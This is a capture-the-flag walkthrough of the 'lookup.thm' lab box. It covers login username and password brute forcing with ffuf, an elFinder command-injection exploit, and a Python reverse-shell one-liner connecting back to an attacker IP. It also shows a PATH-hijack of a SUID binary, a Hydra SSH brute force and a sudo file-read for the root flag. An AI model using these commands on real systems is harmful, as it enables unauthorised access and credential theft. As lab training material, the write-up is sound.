[[Web Challenge]] | [[Easy]]

When first going to the IP given to us, I got a 'Page Not Found' error as the IP redirects to 'lookup.thm'. This is not part of the challenge, but I figured it may be worth including in case I decide to post these some day and someone else runs into the same issue. To fix it, we just have to add the IP to /etc/hosts like below:
```
127.0.0.1         localhost
127.0.1.1         kali.domain.com kali
10.113.171.94     lookup.thm
```
Now to the actual challenge:

We're presented with a login page. Since the task description mentioned scanning and enumeration to uncover services and subdomains, I started out by fuzzing and nmap scanning the domain. 
`nmap -sT 10.113.171.94 -v`

`ffuf -u http://10.113.171.94/api/items/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .txt,.php,.bak,.old,.log,.conf,.pem,.key`

Our nmap shows ssh (22) & http (80) open, and netbus (12345) filtered, and our fuzzing turned up with nothing. 

When trying different usernames on the login page, you can see that 'admin' just shows a "Wrong password. Please try again.", while other usernames, such as 'user' show "Wrong username **or password.** Please try again." With this information, we can enumerate usernames based on the responses. 

When trying to do a normal curl request with our already known 'admin' username, it seemed to not receive the request properly, possibly due to some missing headers. This means we'll have to get a bit crafty with it. 

If we submit our normal 'admin' username and freeze the browser with burpsuite so we don't get redirected, we can copy a cURL form of our POST request that we will turn into an ffuf fuzzing command.  
![[Screenshot_2026-03-06_18_19_28(1).png|441]]
With this, our original curl command:
```
curl 'http://lookup.thm/login.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://lookup.thm' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://lookup.thm/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36' \
  --data-raw 'username=admin&password=admin' \
  --insecure
```

Now turns into the following ffuf which we can use to enumerate more usernames (the -fw 10 filters out responses with 10 words):
```
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \  
-u http://lookup.thm/login.php \  
-X POST \  
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \  
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \  
-H "Accept-Language: en-US,en;q=0.5" \  
-H "Accept-Encoding: gzip, deflate" \  
-H "Content-Type: application/x-www-form-urlencoded" \  
-H "Origin: http://lookup.thm" \  
-H "Referer: http://lookup.thm/" \  
-H "Connection: keep-alive" \  
-H "Upgrade-Insecure-Requests: 1" \  
-d "username=FUZZ&password=admin" \  
-fw 10
```

With this, we also get the username 'jose' that we can use to log in with. 

>admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 145ms]
>jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 145ms]
>:: Progress: [10713/10713] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:42] :: Errors: 0 ::`

Now, if we try fuzzing for a password with almost the same using 'admin' as the username and using -fs to filter size 62 responses out, we can see that our command returns the following:

>password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 145ms]
>:: Progress: [96507/96507] :: Job [1/1] :: 335 req/sec :: Duration: [0:06:01] :: Errors: 0 ::

This password123 with a 302 error is weird, so let's try it with the 'jose' account we found earlier instead. Doing this gives a "Page Not Found" error again, so we need to add this new files.lookup.thm to our /etc/hosts file as well. 

Once we get into the site, we are presented with an elFinder web file explorer. If we check the version info on this, we'll be able to see it's running version 2.1.47; which just to happens to have a critical vulnerability that we can exploit. 

![[Screenshot_2026-03-06_19_40_03(1).png|397]]

To do this, I used this [proof of concept](https://github.com/estebanzarate/CVE-2019-9194-elFinder-Command-Injection-PoC) which directly gave me a remote shell. Now, trying to do a lot of things in this shell are not possible. Because of this we instead need to spawn another reverse shell with this so that we can get more functionality of commands such as curl, cat, etc.
Listener: `nc -lvnp 4444`
Connect back: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.164.173",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`

Now that we have a functional reverse shell:

If we run `find / -perm -4000 2>/dev/null` we can see that they are running pkexec, and it happens to be an old, exploitable version (.105). I tried using  [mebeim's POC](https://github.com/mebeim/CVE-2021-4034) that has worked for boxes for me in the past, but kept running into an error. This also happened with every other PoC I attempted, so I looked into some other SUID binaries instead.

After checking again what binaries there are, one unusual one, '/usr/sbin/pwm' shows up. When changing to a cleaner folder with write permissions (/tmp) and running it, we get the following output:

>www-data@ip-10-114-172-148:/tmp$ /usr/sbin/pwm
>/usr/sbin/pwm
>[!] Running 'id' command to extract the username and user ID (UID)
>[!] ID: www-data
>[-] File /home/www-data/.passwords not found

This reveals the binary is running the `id` command and using the output id to search for a .passwords file. If we check the files of the other users in /home, we can see that 'think' is the only one with a .passwords file. If we can trick this program into thinking we're the user 'think', then it should be able to read the other users .passwords file.

The easiest way to do this is run 'id' for ourselves to have a good visual on the format it expects:

>www-data@ip-10-114-172-148:/tmp$ id
>id
>uid=33(www-data) gid=33(www-data) groups=33(www-data)

This shows us the format of our www-data user id, which we can use in order to make a fake 'id' executable file. Since vim and nano are usually problematic in reverse shells, we can instead do the following to create an imitation id program:
`echo '#!/bin/bash' > id`
`echo 'echo "uid=34(think) gid=34(think) groups=34(think)"' >> id`

This adds a shebang with bash on the top to specify it's a bash script. The echo command also needs to be passed into the file in order to make the id program output the user information for the 'pwm' binary to use later.

We also need to specify that 'id' needs to use this file. To do this, we run `export PATH=/tmp:$PATH`, this makes the first element in our PATH list (`echo $PATH`) as /tmp for where it will check for the 'id' program. Finally, we just need to make it executable: `chmod +x id`

With this, we should be able to finally run it:
![[Screenshot_2026-03-07_15_32_18(1).png|351]]

Perfect! We got what seems to be a list of passwords. Since our list is small we can just copy and paste it into a local file, for mine I just named it temp.txt. With this, we can brute force ssh the 'think' user and see if we can get access:
`hydra -l think -P temp.txt ssh://lookup.thm`
>\[22]\[ssh] host: lookup.thm   login: think   password: josemario.AKA(think)

Once we ssh into the think account, we can then look for a way to get escalated privileges. If we run `sudo -l` we can see that the /usr/bin/look can run with sudo privileges, which is what we'll need to get our final flag. 

For this, all we need to run is: 
`sudo look '' /root/root.txt`
Which gives us our final flag:
>5a285a9f257e45c68bb6c9f9f57d18e8
